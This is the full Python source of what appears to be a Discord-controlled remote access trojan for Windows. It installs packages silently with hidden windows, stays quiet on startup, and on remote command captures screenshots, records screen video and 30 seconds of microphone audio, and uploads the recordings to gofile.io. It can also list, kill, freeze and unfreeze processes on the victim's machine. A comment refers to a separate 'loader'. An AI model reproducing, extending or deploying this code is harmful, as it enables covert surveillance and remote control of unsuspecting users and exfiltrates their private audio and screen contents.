import os
import sys
import time
import tempfile
import subprocess
import ctypes
import requests
import discord
from discord.ext import commands
import mss
from PIL import Image
import numpy as np
import cv2

# ==================== CONFIG ====================
DISCORD_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
# ================================================

# ---------- PACKAGE BOOTSTRAP (in case loader missed any) ----------
import importlib
REQUIRED_PACKAGES = {
    "discord": "discord.py",
    "PIL": "Pillow",
    "mss": "mss",
    "numpy": "numpy",
    "requests": "requests",
    "cv2": "opencv-python",
    "sounddevice": "sounddevice",
    "soundfile": "soundfile",
}

def ensure_packages():
    for mod, pkg in REQUIRED_PACKAGES.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--quiet", pkg],
                creationflags=(0x08000000 if os.name == "nt" else 0),
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

ensure_packages()

# ---------- IMPORTS THAT NEED SOUNDDEVICE ----------
import sounddevice as sd
import soundfile as sf

# ---------- WIN32 CONSTANTS ----------
PROCESS_SUSPEND_RESUME = 0x0800
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002

# ---------- BOT SETUP ----------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=",", intents=intents)


# ==========================================================
# EXISTING HELPERS
# ==========================================================
def take_screenshot(path: str):
    with mss.mss() as sct:
        monitor = sct.monitors[0]
        shot = sct.grab(monitor)
        img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
        img.save(path, "PNG")


def record_screen(path: str, duration=30, fps=60):
    with mss.mss() as sct:
        monitor = sct.monitors[0]
        width = monitor["width"] - (monitor["width"] % 2)
        height = monitor["height"] - (monitor["height"] % 2)

        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(path, fourcc, fps, (width, height))

        frame_interval = 1.0 / fps
        end_time = time.time() + duration

        while time.time() < end_time:
            loop_start = time.time()
            shot = sct.grab(monitor)
            frame = np.array(shot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            frame = frame[:height, :width]
            out.write(frame)

            elapsed = time.time() - loop_start
            sleep_for = frame_interval - elapsed
            if sleep_for > 0:
                time.sleep(sleep_for)

        out.release()


def upload_to_gofile(filepath: str) -> str:
    r = requests.get("https://api.gofile.io/servers", timeout=15)
    r.raise_for_status()
    server = r.json()["data"]["servers"][0]["name"]

    url = f"https://{server}.gofile.io/contents/uploadfile"
    with open(filepath, "rb") as f:
        files = {"file": (os.path.basename(filepath), f)}
        resp = requests.post(url, files=files, timeout=120)
    resp.raise_for_status()
    data = resp.json()
    return data["data"]["downloadPage"]


# ==========================================================
# WINDOW / PROCESS HELPERS
# ==========================================================
def get_visible_windows():
    """
    Return a list of (pid, process_name, window_title) for processes that
    own a visible top-level window. Excludes background processes like
    svchost, csrss, dwm, etc.
    """
    if os.name != "nt":
        return []

    user32 = ctypes.WinDLL("user32", use_last_error=True)
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    psapi = ctypes.WinDLL("psapi", use_last_error=True)

    results = []
    seen_pids = set()

    WNDENUMPROC = ctypes.WINFUNCTYPE(
        ctypes.c_bool, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int)
    )

    def enum_cb(hwnd, lparam):
        if not user32.IsWindowVisible(hwnd):
            return True

        length = user32.GetWindowTextLengthW(hwnd)
        if length == 0:
            return True  # No title — background/hidden window

        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        title = buf.value.strip()
        if not title:
            return True

        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        pid = pid.value
        if pid in seen_pids:
            return True

        # Get process name
        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
        h = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
        if not h:
            return True
        try:
            size = ctypes.c_ulong(260)
            name_buf = ctypes.create_unicode_buffer(260)
            if psapi.GetModuleBaseNameW(h, None, name_buf, size):
                proc_name = name_buf.value
            else:
                proc_name = "unknown"
        finally:
            kernel32.CloseHandle(h)

        seen_pids.add(pid)
        results.append((pid, proc_name, title))
        return True

    user32.EnumWindows(WNDENUMPROC(enum_cb), 0)
    return results


def find_pids_by_name(name: str):
    """Find all PIDs whose process name matches (case-insensitive, with or without .exe)."""
    if os.name != "nt":
        return []

    target = name.lower()
    if not target.endswith(".exe"):
        target_exe = target + ".exe"
    else:
        target_exe = target

    matches = []

    # Use tasklist for a simple, reliable listing
    try:
        out = subprocess.check_output(
            ["tasklist", "/FO", "CSV", "/NH"],
            creationflags=0x08000000,
            stderr=subprocess.DEVNULL,
        ).decode(errors="ignore")

        for line in out.splitlines():
            parts = [p.strip('"') for p in line.split('","')]
            if len(parts) < 2:
                continue
            proc_name = parts[0].strip('"').lower()
            try:
                pid = int(parts[1].strip('"'))
            except ValueError:
                continue
            if proc_name == target_exe or proc_name == target:
                matches.append((pid, proc_name))
    except Exception:
        pass

    return matches


def suspend_process(pid: int) -> bool:
    if os.name != "nt":
        return False
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

    h = kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
    if not h:
        return False
    try:
        # NtSuspendProcess
        status = ntdll.NtSuspendProcess(h)
        return status == 0
    finally:
        kernel32.CloseHandle(h)


def resume_process(pid: int) -> bool:
    if os.name != "nt":
        return False
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

    h = kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
    if not h:
        return False
    try:
        # NtResumeProcess
        status = ntdll.NtResumeProcess(h)
        return status == 0
    finally:
        kernel32.CloseHandle(h)


def kill_pid(pid: int) -> bool:
    if os.name != "nt":
        return False
    try:
        subprocess.call(
            ["taskkill", "/F", "/PID", str(pid)],
            creationflags=0x08000000,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return True
    except Exception:
        return False


# ==========================================================
# AUDIO RECORDING
# ==========================================================
def record_mic(path: str, duration=30, samplerate=44100):
    """Record from the default microphone input for `duration` seconds."""
    channels = 1
    # Record
    recording = sd.rec(
        int(duration * samplerate),
        samplerate=samplerate,
        channels=channels,
        dtype="int16",
    )
    sd.wait()  # blocks until done

    # Save as WAV
    sf.write(path, recording, samplerate)


# ==========================================================
# COMMANDS
# ==========================================================
@bot.event
async def on_ready():
    pass  # silent


@bot.command(name="screenshot")
async def screenshot_cmd(ctx):
    await ctx.message.add_reaction("⏳")
    tmp = os.path.join(tempfile.gettempdir(), f"shot_{int(time.time())}.png")
    try:
        take_screenshot(tmp)
        await ctx.send(file=discord.File(tmp))
        await ctx.message.remove_reaction("⏳", bot.user)
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Screenshot failed: `{e}`")
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass


@bot.command(name="video")
async def video_cmd(ctx):
    await ctx.message.add_reaction("⏳")
    await ctx.send("🎥 Recording 30 seconds at 60 FPS...")

    tmp = os.path.join(tempfile.gettempdir(), f"rec_{int(time.time())}.mp4")
    try:
        await bot.loop.run_in_executor(None, record_screen, tmp)

        await ctx.send("☁️ Uploading to gofile.io...")
        link = await bot.loop.run_in_executor(None, upload_to_gofile, tmp)
        await ctx.send(f"✅ **Recording ready:** {link}")
        await ctx.message.remove_reaction("⏳", bot.user)
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Recording failed: `{e}`")
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass


@bot.command(name="tasks")
async def tasks_cmd(ctx):
    """List all processes that have a visible top-level window (no background services)."""
    try:
        windows = await bot.loop.run_in_executor(None, get_visible_windows)
        if not windows:
            await ctx.send("No visible windows found.")
            return

        # Group by process name for a cleaner list
        grouped = {}
        for pid, name, title in windows:
            grouped.setdefault(name.lower(), []).append((pid, title))

        lines = []
        for name in sorted(grouped.keys()):
            entries = grouped[name]
            pids = ", ".join(str(p) for p, _ in entries)
            lines.append(f"**{name}**  (PID: {pids})")

        # Split if too long for one message (Discord limit 2000 chars)
        chunk = "**🪟 Visible window processes:**\n"
        for line in lines:
            if len(chunk) + len(line) + 1 > 1900:
                await ctx.send(chunk)
                chunk = ""
            chunk += line + "\n"
        if chunk.strip():
            await ctx.send(chunk)
    except Exception as e:
        await ctx.send(f"❌ Failed to list tasks: `{e}`")


@bot.command(name="kill")
async def kill_cmd(ctx, *, task_name: str = None):
    """Kill a process by name. Example: ,kill Chrome"""
    if not task_name:
        await ctx.send("Usage: `,kill <TaskName>`  e.g. `,kill Chrome`")
        return

    await ctx.message.add_reaction("⏳")
    try:
        matches = await bot.loop.run_in_executor(None, find_pids_by_name, task_name)
        if not matches:
            await ctx.send(f"❌ No process found matching `{task_name}`")
            return

        killed = []
        for pid, name in matches:
            ok = await bot.loop.run_in_executor(None, kill_pid, pid)
            if ok:
                killed.append(f"{name} (PID {pid})")

        if killed:
            await ctx.send("✅ Killed: " + ", ".join(killed))
        else:
            await ctx.send(f"❌ Failed to kill `{task_name}`")
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Kill failed: `{e}`")


@bot.command(name="freeze")
async def freeze_cmd(ctx, *, task_name: str = None):
    """Suspend a process (makes it unresponsive). Example: ,freeze Chrome"""
    if not task_name:
        await ctx.send("Usage: `,freeze <TaskName>`  e.g. `,freeze Chrome`")
        return

    await ctx.message.add_reaction("⏳")
    try:
        matches = await bot.loop.run_in_executor(None, find_pids_by_name, task_name)
        if not matches:
            await ctx.send(f"❌ No process found matching `{task_name}`")
            return

        frozen = []
        for pid, name in matches:
            ok = await bot.loop.run_in_executor(None, suspend_process, pid)
            if ok:
                frozen.append(f"{name} (PID {pid})")

        if frozen:
            await ctx.send("🧊 Frozen: " + ", ".join(frozen))
        else:
            await ctx.send(f"❌ Failed to freeze `{task_name}` (try running as admin)")
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Freeze failed: `{e}`")


@bot.command(name="unfreeze")
async def unfreeze_cmd(ctx, *, task_name: str = None):
    """Resume a suspended process. Example: ,unfreeze Chrome"""
    if not task_name:
        await ctx.send("Usage: `,unfreeze <TaskName>`  e.g. `,unfreeze Chrome`")
        return

    await ctx.message.add_reaction("⏳")
    try:
        matches = await bot.loop.run_in_executor(None, find_pids_by_name, task_name)
        if not matches:
            await ctx.send(f"❌ No process found matching `{task_name}`")
            return

        thawed = []
        for pid, name in matches:
            ok = await bot.loop.run_in_executor(None, resume_process, pid)
            if ok:
                thawed.append(f"{name} (PID {pid})")

        if thawed:
            await ctx.send("🔥 Unfrozen: " + ", ".join(thawed))
        else:
            await ctx.send(f"❌ Failed to unfreeze `{task_name}` (try running as admin)")
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Unfreeze failed: `{e}`")


@bot.command(name="mic")
async def mic_cmd(ctx):
    """Record 30s from the default microphone, upload to gofile, return link."""
    await ctx.message.add_reaction("⏳")
    await ctx.send("🎙️ Recording 30 seconds from microphone...")

    tmp = os.path.join(tempfile.gettempdir(), f"mic_{int(time.time())}.wav")
    try:
        await bot.loop.run_in_executor(None, record_mic, tmp)

        await ctx.send("☁️ Uploading to gofile.io...")
        link = await bot.loop.run_in_executor(None, upload_to_gofile, tmp)
        await ctx.send(f"✅ **Audio ready:** {link}")
        await ctx.message.remove_reaction("⏳", bot.user)
        await ctx.message.add_reaction("✅")
    except Exception as e:
        await ctx.send(f"❌ Mic recording failed: `{e}`")
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass


# ==========================================================
# RUN
# ==========================================================
if __name__ == "__main__":
    if DISCORD_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        sys.exit(1)
    bot.run(DISCORD_BOT_TOKEN)
